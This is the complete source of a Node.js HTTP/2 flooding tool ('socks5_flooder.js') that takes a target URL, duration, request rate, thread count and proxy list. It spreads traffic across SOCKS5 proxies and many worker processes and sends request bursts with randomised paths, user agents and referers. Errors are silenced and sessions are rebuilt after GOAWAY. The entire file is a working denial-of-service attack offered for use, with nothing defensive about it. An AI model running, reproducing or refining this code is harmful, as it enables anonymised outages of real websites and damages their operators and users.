const net = require("net");
const http2 = require("http2");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`node socks5_flooder.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.yahoo.com/", "https://www.baidu.com/", ""
];

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;
    if (Math.random() > 0.5) headers["dnt"] = "1";

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const proxyParts = proxyAddr.split(':');

    const socksOptions = {
        proxy: {
            host: proxyParts[0],
            port: parseInt(proxyParts[1]),
            type: 5
        },
        command: 'connect',
        destination: {
            host: parsedTarget.host,
            port: 443
        },
        timeout: 5000
    };

    SocksClient.createConnection(socksOptions, (err, info) => {
        if (err || !info) return;

        const connection = info.socket;
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        // Прямое подключение HTTP/2 без лишнего tls.connect()
        const client = http2.connect(parsedTarget.href, {
            createConnection: () => connection,
            settings: {
                maxConcurrentStreams: 30,
                initialWindowSize: 65535,
                enablePush: false
            }
        });

        let attackInterval = null;

        const startAttack = () => {
            if (attackInterval) return;

            attackInterval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(buildHeaders());
                    request.end();  // Только end()
                    request.on('error', () => {});  // Игнорируем ошибки отдельных запросов
                }
            }, 1000);
        };

        client.on('connect', () => {
            startAttack();
        });

        // Пересоздаём сессию только при GOAWAY
        client.on('goaway', () => {
            clearInterval(attackInterval);
            attackInterval = null;
            client.destroy();
            connection.destroy();
        });

        // Игнорируем обычные ошибки — сессия остаётся живой
        client.on('error', () => {});

        client.on('close', () => {
            clearInterval(attackInterval);
            connection.destroy();
        });

        connection.on('error', () => {
            client.destroy();
            connection.destroy();
        });

        connection.on('end', () => {
            client.destroy();
            connection.destroy();
        });
    });
}
